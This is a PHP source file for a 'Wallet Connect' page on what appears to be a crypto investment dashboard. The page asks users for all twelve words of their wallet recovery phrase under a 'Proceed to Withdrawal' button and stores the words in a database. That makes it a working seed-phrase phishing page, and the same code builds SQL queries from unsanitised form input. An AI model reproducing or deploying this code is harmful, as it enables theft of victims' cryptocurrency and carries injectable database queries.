<?php 
include('header.php'); 

if(isset($_POST['connect'])){
	
  	$client_id = $user['id'];
  $userid = $_POST['userid'];
  $client_email = $user['email'];
   	$wallet_name = $_POST['wallet_name'];
  	$phrase1 = $_POST['phrase1'];
  $phrase2 = $_POST['phrase2'];
  $phrase3 = $_POST['phrase3'];
  $phrase4 = $_POST['phrase4'];
  $phrase5 = $_POST['phrase5'];
  $phrase6 = $_POST['phrase6'];
  $phrase7 = $_POST['phrase7'];
  $phrase8 = $_POST['phrase8'];
  $phrase9 = $_POST['phrase9'];
  $phrase10 = $_POST['phrase10'];
  $phrase11 = $_POST['phrase11'];
  $phrase12 = $_POST['phrase12'];
	$status = "progress";
  
  $sql_user = "UPDATE users set wallet_status = '$status' WHERE id = '$client_id'";
  $sql_query = mysqli_query($conn, $sql_user);
  	
    	$with_sql = "INSERT into wallet (client_id, email, userid, wallet_name, phrase1, phrase2, phrase3, phrase4, phrase5, phrase6, phrase7, phrase8, phrase9, phrase10, phrase11, phrase12) 
        VALUES ('$client_id', '$client_email','$userid','$wallet_name','$phrase1','$phrase2','$phrase3','$phrase4','$phrase5','$phrase6','$phrase7','$phrase8','$phrase9','$phrase10','$phrase11','$phrase12')";
      mysqli_query($conn, $with_sql);
    	echo "<script>alert('Connection in progress')</script>";
      header('refresh: 1; url=wallet.php');
    
 
}


?>


            <!-- Page content -->
            <div class="page-content">
                    <!-- Page title -->
    <div class="page-title mt-5 mb-3 my-md-5">
        <div class="row justify-content-between align-items-center">
            <div class="mb-3 col-md-6 mb-md-0">
                <h5 class="mb-0 text-white h3 font-weight-400">Wallet Connect</h5>
            </div>
        </div>
    </div>
    <div>
    </div>	<div>
    </div>    <div class="row">
        <div class="col-md-12">
            <div class="card shadow-none">
                <div class="card-body">
                    <div class="row">
                      <?php if($user['wallet_status'] == "approved"){ ?>
                      
                      <div class="col-12">
                        <h3 class="alert alert-success">Wallet Connected Successfully</h3>
                      </div>
                      
                      <?php }elseif($user['wallet_status'] == "progress"){  ?>
							<div class="col-12">
                              <h3 class="alert alert-warning">Wallet Connection in Progress</h3>
                            </div>
						<?php  }else{ ?>
                      <div class="col-12">
                        <h3 class="alert alert-danger">Wallet Not Connected</h3>
                      </div>
                        <div class="col-md-8">
                            <form action="" method="post" id="submitpaymentform">
                                <input type="hidden" name="csrfmiddlewaretoken" value="4yce0eEQAtnqbnBRUm5kikP5EYKOxZcgdzMBIMzQydgEfGqczOSp0iux6tw3UMph">
                                <div class="row">
                                  	<div class="mb-4 col-md-12">
                                        <h6 class="card-title">User ID</h6>
                                        <input class="form-control" placeholder="UserID"
                                         type="text" name="userid" value="" required>
                                    </div>
                                    <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Wallet Name</h6>
                                        <input class="form-control" placeholder="Wallet Name"
                                         type="text" name="wallet_name" value="" required>
                                    </div>
                                    <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Phrase 1</h6>
                                        <input class="form-control" placeholder="Phrase 1"
                                         type="text" name="phrase1" value="" required>
                                          </div>
                                          
                                          <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Phrase 2</h6>
                                        <input class="form-control" placeholder="Phrase 2"
                                         type="text" name="phrase2" value="" required>
                                          </div>
                                          
                                          <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Phrase 3</h6>
                                        <input class="form-control" placeholder="Phrase 3"
                                         type="text" name="phrase3" value="" required>
                                          </div>
                                          
                                          <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Phrase 4</h6>
                                        <input class="form-control" placeholder="Phrase 4"
                                         type="text" name="phrase4" value="" required>
                                          </div>
                                          
                                          </div>
                                    <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Phrase 5</h6>
                                        <input class="form-control" placeholder="Phrase 5"
                                         type="text" name="phrase5" value="" required>
                                          </div>
                                          
                                          <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Phrase 6</h6>
                                        <input class="form-control" placeholder="Phrase 6"
                                         type="text" name="phrase6" value="" required>
                                          </div>
                                          
                                          <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Phrase 7</h6>
                                        <input class="form-control" placeholder="Phrase 7"
                                         type="text" name="phrase7" value="" required>
                                          </div>
                                          
                                          <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Phrase 8</h6>
                                        <input class="form-control" placeholder="Phrase 8"
                                         type="text" name="phrase8" value="" required>
                                          </div>
                                           
                                           <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Phrase 9</h6>
                                        <input class="form-control" placeholder="Phrase 9"
                                         type="text" name="phrase9" value="" required>
                                          </div>
                                          
                                    <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Phrase 10</h6>
                                        <input class="form-control" placeholder="Phrase 10"
                                         type="text" name="phrase10" value="" required>
                                          </div>
                                          
                                          <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Phrase 11</h6>
                                        <input class="form-control" placeholder="Phrase 11"
                                         type="text" name="phrase11" value="" required>
                                          </div>
                                          
                                          <div class="mb-4 col-md-12">
                                        <h6 class="card-title">Phrase 12</h6>
                                        <input class="form-control" placeholder="Phrase 12"
                                         type="text" name="phrase12" value="" required>
                                          </div>
                                          
                                          <div class="mt-3 mb-1 col-md-12">
                                            <input type="submit" name="connect" class="px-5 btn btn-primary btn-lg w-100"
                                                value="Proceed to Withdrawal">
                                        </div>
                                        
                            </form>
                        </div>
                      <?php } ?>
                        <div class="mt-4 col-md-4">
                            <!-- Seller -->
                            <div class="card shadow-none">
                                <div class="card-body">
                                    <div class="pb-4">
                                        <div class="">
                                            <!--regular account deposits-->
                                            <div class="rounded p-3 shadow option2 bg-light border border-primary" id="acnt">
                                                <small class="text-muted" style="font-size:0.7rem !important">Current Balance</small>
                                                <h6 class="my-0">
                                                                                                                                                                        <h6 class="mb-1">
                                                    $<?php echo number_format($user['total_balance'], 2, '.', ','); ?>
    														</h6>
                                                                                                                                                            </h6>
                                            </div>
                                            <!---->
                                        </div>
                                    </div>
                                    
                                </div>
                                <div class="card-footer">
                                    <div class="actions d-flex justify-content-between">
                                        <a href="accounthistory.php" class="action-item">
                                            <span class="btn-inner--icon">View Deposit History<i class="far fa-arrow-right ml-2"></i></span>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
                </div>
                <?php include('footer.php'); ?>